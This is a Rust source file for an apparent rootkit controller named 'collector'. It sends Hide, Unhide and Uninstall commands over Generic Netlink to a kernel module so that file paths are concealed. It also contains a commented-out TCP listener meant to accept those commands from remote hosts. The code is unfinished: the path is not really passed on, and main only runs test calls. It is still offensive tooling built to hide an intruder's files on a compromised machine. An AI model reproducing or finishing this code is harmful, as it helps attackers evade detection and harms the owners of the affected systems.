extern crate protobuf;
extern crate collector;

use std::thread;
use std::process;
use std::net::{TcpListener, TcpStream};
use protobuf::*;
use structopt::StructOpt;
use collector::gen::*;
use collector::common::common;
use neli::{
    consts::{
        nl::{NlmF, NlmFFlags},
        socket::NlFamily,
    },
    genl::{Genlmsghdr, Nlattr},
    nl::{NlPayload, Nlmsghdr},
    socket::NlSocketHandle,
    types::{Buffer, GenlBuffer},
};

#[derive(StructOpt)]
#[structopt(name = "collector")]
struct CliArgs {
    /// Port to listen
    #[structopt(short, long)]
    port: i16,
}

const ECHO_MSG: &str = "Olol ololo";
const KERNEL_PID: u32 = 0;
const APP_VERSION: u8 = 1;
pub const FAMILY_NAME: &str = "collector";

neli::impl_var!(pub NlCommand, u8,
    Hide => 0,
    Unhide => 1,
    Uninstall => 2
);

neli::impl_var!(pub NlAttribute, u16,
    Unspec => 0,
    Msg => 1 // Null-terminated string.
);

impl neli::consts::genl::Cmd for NlCommand{}
impl neli::consts::genl::NlAttrType for NlAttribute{}

fn exec_command_kernel(command: NlCommand, path: Option<String>) {
    let mut sock = NlSocketHandle::connect(NlFamily::Generic,  Some(KERNEL_PID), &[]).unwrap();
    let family_id = match sock.resolve_genl_family(FAMILY_NAME) {
        Ok(id) => id,
        Err(e) => {
            eprintln!("Couldn't resolve family {}: {}, is module loaded?", FAMILY_NAME, e);
            return;
        }
    };

    let mut attrs: GenlBuffer<NlAttribute, Buffer> = GenlBuffer::new();
    if path.is_some()
    {
        attrs.push(Nlattr::new(
            None, // nla_len
            false, // nla_nested
            false, // nla_network_order
            NlAttribute::Msg, // payload type
            ECHO_MSG).unwrap());
    }

    let generic_netlink_header = Genlmsghdr::new(command, APP_VERSION, attrs);
    let netlink_header = Nlmsghdr::new(
        None, // nl_len
        family_id,
        NlmFFlags::new(&[NlmF::Request]),
        None, // nl_seq
        Some(process::id()), // used to id app
        NlPayload::Payload(generic_netlink_header));

    sock.send(netlink_header).expect("Send failed"); // TODO MATCH

    let res: Nlmsghdr<u16, Genlmsghdr<NlCommand, NlAttribute>>
        = sock.recv().expect("Should receive a message").unwrap(); // TODO MATCH

    let handle = res.get_payload().unwrap().get_attr_handle();
    let received = handle.get_attr_payload_as::<String>(NlAttribute::Msg).unwrap();
    println!("Received from kernel: '{}'", received);
}

fn hide(path: String) -> response::Response_Result {
    println!("Hide path: {}", path);
    exec_command_kernel(NlCommand::Hide, Some(path));
    return response::Response_Result::OK;
}

fn unhide(path: String) -> response::Response_Result {
    println!("Unhide path: {}", path);
    exec_command_kernel(NlCommand::Unhide, Some(path));
    return response::Response_Result::OK;
}

fn uninstall() -> response::Response_Result {
    println!("Uninstall");
    exec_command_kernel(NlCommand::Uninstall, None);
    return response::Response_Result::OK;
}

fn exec_command(command: &commands::Command) -> response::Response_Result {
    return match command.get_command_type() {
        commands::Command_Type::HIDE => {
            assert!(command.has_path());
            hide(command.get_path().to_string())
        },

        commands::Command_Type::UNHIDE => {
            assert!(command.has_path());
            unhide(command.get_path().to_string())
        },

        commands::Command_Type::UNINSTALL =>
            uninstall()
    }
}

fn send_response(mut stream: &TcpStream, result: response::Response_Result) {
    println!("Send response: {:?}", result);

    let mut response = response::Response::new();
    response.set_result(result);
    common::send_message(&mut stream, &response);
}

fn handle_command(mut stream: TcpStream) {
    let command = match commands::Command::parse_from_reader(&mut stream){
        Ok(command) => command,
        Err(e) => {
            eprintln!("Failed to parse message: {}", e);
            return;
        }
    };

    send_response(&mut stream, exec_command(&command));
}



fn main() {

    hide(String::from("ololo"));
    unhide(String::from("ololo"));
    //uninstall();

    /*let pkt = vec![ 0x14 ];

    let socket = Socket::new(31).unwrap();
    let kernel_addr = SocketAddr::new(0, 0);
    let n_sent = socket.send_to(&pkt[..], &kernel_addr, 0).unwrap();
    socket.send()
    println!("Sent {}", n_sent);
    assert_eq!(n_sent, pkt.len());

    let mut buf = vec![0; 4];
    loop {
        let (n_received, sender_addr) = socket.recv_from(&mut buf[..], 0).unwrap();
        assert_eq!(sender_addr, kernel_addr);

        let s = String::from_utf8(buf).unwrap();
        let v = u32::from_str_radix(&s, 16).unwrap();
        println!("received datagram {:?}", &buf[..n_received]);


    }*/


    return;

    /*let args = CliArgs::from_args();
    let bind_str = format!("0.0.0.0:{}", args.port);

    let listener = TcpListener::bind(bind_str).unwrap();
    println!("Listening to port {}", args.port);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                thread::spawn(move || {  handle_command(stream) });
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }

    drop(listener);*/
}
